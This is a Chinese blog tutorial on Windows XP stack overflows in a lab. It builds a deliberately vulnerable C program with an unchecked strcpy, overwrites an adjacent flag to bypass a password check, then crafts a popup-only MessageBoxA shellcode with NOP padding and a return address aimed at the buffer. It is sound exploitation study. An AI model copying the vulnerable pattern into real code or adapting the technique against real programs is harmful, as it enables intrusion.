---
link: https://blog.csdn.net/2403_88102829/article/details/160621600
title: winXP栈溢出漏洞深度学习
description: 围绕 Windows XP 与 VC6、OllyDbg 环境，分析邻接变量覆盖、返回地址控制、NOP 滑板和 Shellcode 调试等栈溢出基础。
excerpt: 围绕 Windows XP 与 VC6、OllyDbg 环境，分析邻接变量覆盖、返回地址控制、NOP 滑板和 Shellcode 调试等栈溢出基础。
keywords: 安全性测试,网络安全,栈溢出,ollydbg
author: Lee
date: 2026-07-20T02:39:09.710Z
categories:
  - 漏洞研究
tags:
  - Windows
  - 栈溢出
  - 漏洞利用
---
一：环境

windowsXP，vc6，ollydbg，ultraedit

二：覆盖邻接变量

原理：利用strcpy函数不会检查长度的漏洞，覆盖临近数组的flag变量，从而绕过验证

先构建一个漏洞程序

因为栈的生长方向是从高地址到低地址的，也就是先声明的变量在高地址，后声明的变量在低地址

**栈向下生长，但数组向上溢出**，我们的buffer数组预先只定义了44个字节的位置，所以buffr数组溢出的第一个字节就是flag的位置

![](https://i-blog.csdnimg.cn/direct/e5d7a17589c94056864ecfc484865884.png)

在vc6里面新建一个空项目，添加一个.c文件

```
#include <stdio.h>
#include <windows.h>
#include <string.h>

#define REGCODE "12345678"

int verify(char *code)
{
    int flag;    //邻接变量，位于buffer下方
    char buffer[44];    //缓冲区，共44字节
    flag = strcmp(REGCODE, code);
    strcpy(buffer, code);    //无长度检查的strcpy函数
    return flag;    //是否通过验证
}

void main()
{
    int vFlag = 0;
    char regcode[1024];
    FILE *fp;

    LoadLibrary("user32.dll");

    if (!(fp = fopen("reg.txt", "r+")))
        exit(0);

    fscanf(fp, "%s", regcode);
    //fp：文件指针
    //fscanf会在字符串末尾自动添加'\0'
    vFlag = verify(regcode);

    if (vFlag)
        printf("wrong regcode!");
    else
        printf("passed!");

    fclose(fp);
}</string.h></windows.h></stdio.h>
```

编译

![](https://i-blog.csdnimg.cn/direct/8a489000b2fd46a4ac37604168bedaed.png)

在debug文件同层创建一个reg.txt，写入密码12345678，运行看看有没有问题

![](https://i-blog.csdnimg.cn/direct/dcf0ddbce3704dd6bc8db7f6297f706f.png)

![](https://i-blog.csdnimg.cn/direct/5f0abcb6f9d14759be068d2b3ea17a2c.png)

正常

![](https://i-blog.csdnimg.cn/direct/d0c512ff676e42ed8cd4f0420989587b.png)

输入44个'1'，填充44个字节没因为fscanf会自动在末尾加上\0，这个\0会覆盖flag的最低位，把flag从1变成0，表示验证通过了

![](https://i-blog.csdnimg.cn/direct/48b6990a7fd34505baf0255170e25c62.png)

防御方向：限制复制长度

二：植入shellcode（运行漏洞程序后令win系统弹出弹窗）

user32.dll：win动态链接库，包含messageboxa函数

MessageBoxA：是Windows 系统中弹出提示框的 API 函数。调用它就能显示一个窗口

实现思路：后面的 shellcode 需要直接调用 MessageBoxA，但代码里不能写函数名（因为植入的是机器码），必须知道它在内存中的 **入口地址**，然后让程序跳转到这个地址去执行。

所以我们先通过这个c代码得到

![](https://i-blog.csdnimg.cn/direct/500284642a044d7684a2148730941731.png)

在 Windows XP 中，user32.dll 的加载基址是 0x77D10000。

MessageBoxA 在 user32.dll 中的偏移是 0x000407EA。

入口地址 = 基址 + 偏移 =0x77D10000 + 0x000407EA = 0x77D507EA

ollydbg打开exe文件，在菜单的试图里面找到调试窗口→watch

在watch窗口里面搜一下&buffer

得到buffer的地址：0x0012faf0

![](https://i-blog.csdnimg.cn/direct/ca7927af4d8243f5a10d7ec67c4a74c1.png)

开始构建shellcode，首先，调用MessageBoxA函数，我们需要四个参数：

1hWnd——父窗口句柄指定哪个窗口作为消息框的父窗口，这个实验我们传进去0/NULL，表示这是一个独立的窗口2IpText显示的文本3IpCaption标题栏文字4uType按钮类型，这个实验传0，代表只显示确定按钮

在win中，压栈顺序是从右往左，所以参数顺序是4321，之后就可以调用MessageBoxA

在压到3，2参数部分的时候，要对字符串进行处理，要先把字符串写入栈内存，再把字符串的地址作为参数进行传递

顺序如下：

汇编机器码作用 `XOR EBX, EBX` `33 DB`

EBX = 0 `PUSH EBX` `53`

压入 uType=0（参数4） `PUSH 0x74736577` `68 77 65 73 74`

压入 "west" `PUSH 0x74736577` `68 77 65 73 74`

压入 "west" `MOV EAX, ESP` `8B C4`

EAX = 字符串地址 `PUSH EBX` `53`

压入 hWnd=0（参数1） `PUSH EAX` `50`

压入 lpText（参数2） `PUSH EAX` `50`

压入 lpCaption（参数3） `PUSH EBX` `53`

压入 uType=0（参数4） `MOV EAX, 0x77D507EA` `B8 EA 07 D5 77`

函数地址入 EAX `CALL EAX` `FF D0`

调用

以上0~25这段机器码就是弹窗部分

26~43内18个字节用90填充，表示NOP指令，什么都不做

44~47内四个字节用90填充，覆盖旧的flag

48~51四个字节用90填充，覆盖旧的EBP栈顶指针

（因为返回地址再flag和EBP后面，要覆盖返回地址，必须先把前52个字节填满，90=NOP（空操作），CPU执行到这里什么都不做，继续往下）

52~55四个字节填充 F0 FA 12 00，表示返回地址→指向buffer[0]

打开UltraEdit，CTRL+G进入十六进制，开始填充机器码

![](https://i-blog.csdnimg.cn/direct/896050e17f0d4514b731f3e6da5631fd.png)

之后保存到debug的同层——reg.txt

再次运行程序，成功跳出弹窗

![](https://i-blog.csdnimg.cn/direct/633239cfdd6c4140af9bf999e1006711.png)
